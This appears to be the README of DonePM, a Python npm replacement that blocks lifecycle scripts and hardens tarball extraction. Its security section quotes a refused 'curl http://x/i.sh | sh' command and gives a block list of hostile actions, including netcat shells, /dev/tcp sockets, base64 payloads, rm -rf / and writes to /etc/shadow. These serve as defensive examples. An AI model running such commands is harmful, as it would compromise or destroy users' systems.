# DonePM

A fast, security-first npm replacement written in Python 3.

DonePM reads the same `package.json` and writes the same
`package-lock.json` (`lockfileVersion: 3`) as npm, so a DonePM tree works with
npm and vice versa. What it does *not* do is run code it was not asked to run.

```sh
donepm install                 # install everything in package.json
donepm install left-pad        # add a dependency
donepm run build               # run a package.json script
donepm exec tsc --noEmit       # run a binary from node_modules/.bin
```

## Install

DonePM is pure standard library - no runtime dependencies.

```sh
pip install ./donepm          # or: pip install -e ./donepm
python3 -m donepm --help      # without installing
```

## Commands

| Command | Aliases | Purpose |
| --- | --- | --- |
| `install [pkg...]` | `i`, `add` | install dependencies, or add packages |
| `uninstall <pkg>...` | `remove`, `rm`, `un` | remove packages |
| `run [script]` | `run-script` | run a script from `package.json` |
| `exec <binary>` | `x` | run a binary from `node_modules/.bin` |
| `init` | `create` | write a `package.json` |
| `ls` | `list`, `ll` | list installed packages |
| `audit` | | check the advisory database |
| `publish` | | pack and upload the current package |
| `explain <pkg>` | `why` | show what requires a package |

Options (accepted before or after the command): `--allow-scripts`,
`--allow-binary NAME`, `-y/--yes`, `--dry-run`, `--offline`, `--registry URL`,
`--prefix DIR`, `--json`, `-v/--verbose`, `--version`.

## Security model

DonePM assumes a package you just downloaded is hostile until you say
otherwise. Four layers, in order:

**1. Nothing runs by default.** Lifecycle hooks (`preinstall`, `install`,
`postinstall`, `preuninstall`, `prepare`, ...) are skipped. DonePM prints which
scripts it skipped and how to approve them.

```sh
donepm install                 # scripts skipped, reported on stderr
donepm install --allow-scripts # approve them up front
DONEPM_ALLOW_SCRIPTS=1 donepm install
```

With a terminal attached and no flag, DonePM asks before each script. Without a
terminal (CI) and without a flag, the answer is no.

**2. Hard blocks always win.** Every command is matched against a rule table
before it can run. A match is refused even with `--allow-scripts`:

```
donepm: refused to run evil postinstall: pipes output into a shell
  command: curl http://x/i.sh | sh
```

Blocked outright: piping into a shell, download-and-execute, base64 payload
decoding, raw `/dev/tcp` sockets, netcat shells, `rm -rf /`, `rm -rf ~`,
`rm -rf ./*`, `mkfs`, `dd of=/dev/...`, writes to `/etc/passwd|shadow|sudoers`,
`chmod 777`/`+s`, fork bombs, `shutdown`/`reboot`, `crontab`, `systemctl
enable`, upload flags on `curl`/`wget`, raw socket sends.

Warned about (still needs approval, reason shown first): `sudo`, `su -`, `eval
"..."`, `exec "..."`, `history -c`, `unset HISTFILE`, `scp`/`rsync` to a remote
host.

**3. Binaries need to be known.** A third-party lifecycle script may only
launch an allowlisted binary, and `donepm exec` refuses to start a downloaded
binary that is not on the list. The default allowlist is
`node`, `donejs`, `npm`, `pnpm`, `yarn`, `python`, `python3`, `sh`, `make`,
`go`, `git`, `tsc`, `jest`, `eslint`, `prettier`, `vitest`, `webpack`,
`rollup`, `esbuild`, `ts-node`. Anything else needs `--allow-binary NAME` or
`DONEPM_ALLOW_BINARIES=NAME`.

Three tiers of execution, from most to least trusted:

| What runs | Approval |
| --- | --- |
| `donepm run <script>` - a script from your own `package.json` | the explicit command is the permission; block rules still apply |
| `donepm exec <bin>` - a downloaded binary | the binary has to be on the allowlist |
| a dependency's `postinstall` and friends | `--allow-scripts`, an interactive yes, or `DONEPM_ALLOW_SCRIPTS=1` |

**4. Archives are hostile input.** Tarball extraction rejects absolute paths,
`..` traversal, symlink and hardlink members, setuid/setgid/sticky bits, and
archives that exceed the member, total-size or file-count limits. Every
download is checked against the packument's `integrity` (`sha512`/`sha256`/
`sha1`) before it is unpacked.

Exit codes: `0` success, `1` error, `2` bad usage, `3` refused by the security
policy, `130` interrupted.

## Lockfile

`package-lock.json` is written in npm's v3 shape:

```json
{
  "name": "app",
  "version": "1.0.0",
  "lockfileVersion": 3,
  "requires": true,
  "packages": {
    "": { "name": "app", "version": "1.0.0", "dependencies": { "left-pad": "^1.3.0" } },
    "node_modules/left-pad": {
      "version": "1.3.0",
      "resolved": "https://registry.npmjs.org/left-pad/-/left-pad-1.3.0.tgz",
      "integrity": "sha512-..."
    }
  }
}
```

Resolution hoists a package to the root `node_modules` whenever the copy
already there satisfies the requested range, and nests a copy under the
requiring package otherwise.

## Performance

Measured on this machine against `registry.npmjs.org`, caches cleared before
each cold run, `npm install --no-audit --no-fund` as the baseline:

| Install | npm (cold) | DonePM (cold) | npm (warm) | DonePM (warm) |
| --- | --- | --- | --- | --- |
| `express` (65 packages) | 2.28 s | **1.40 s** | 0.45 s | **0.39 s** |
| `eslint` (~120 packages) | 2.74 s | **1.76 s** | 0.46 s | 0.53 s |

(The numbers move by a few hundred milliseconds between runs; DonePM stayed
~1.6x faster on a cold cache and ~1.2x on a warm cache.) The resulting trees match
npm's: 2209 KiB against 2208 KiB for `express`, 11239 KiB against 11277 KiB for
`eslint`.

Why it is faster:

* Standard library only - startup is a Python interpreter start, not a
  JavaScript runtime boot.
* npm's abbreviated packument is requested
  (`Accept: application/vnd.npm.install-v1+json`), which is a fraction of the
  size of the full document.
* Metadata is resolved level by level, with every packument of a level
  fetched in parallel.
* One keep-alive HTTP connection per host, reused across metadata and tarball
  requests.
* Tarballs are fetched by a thread pool (`workers=8` by default) and
  extracted while streaming - an archive is never written to a temporary file.

Cache: `~/.cache/donepm` (override with `DONEPM_CACHE_DIR`, otherwise
`$XDG_CACHE_HOME/donepm`). Packuments expire after 300 s; tarballs are keyed
by their integrity hash and kept until the cache is removed. The cache lives
outside `node_modules` so that deleting `node_modules` never throws away
downloaded archives.

## Layout

```
donepm/
  cli.py        argparse CLI, one function per command
  security.py   rule table, Policy, permission gating
  installer.py  resolution, hoisting, parallel fetch, lockfile
  registry.py   registry client, spec parsing
  http.py       pooled HTTP client
  manifest.py   package.json + package-lock.json (v3)
  tarball.py    hardened extraction and packing
  semver.py     versions and npm ranges
  errors.py     error types
```

## Tests

```sh
cd donepm
python3 -m unittest discover -s tests
```

76 tests cover the security rules and permission gating, semver ranges, the
lockfile round trip, tarball traversal/symlink defences, hoisting, lifecycle
script gating, and the CLI.
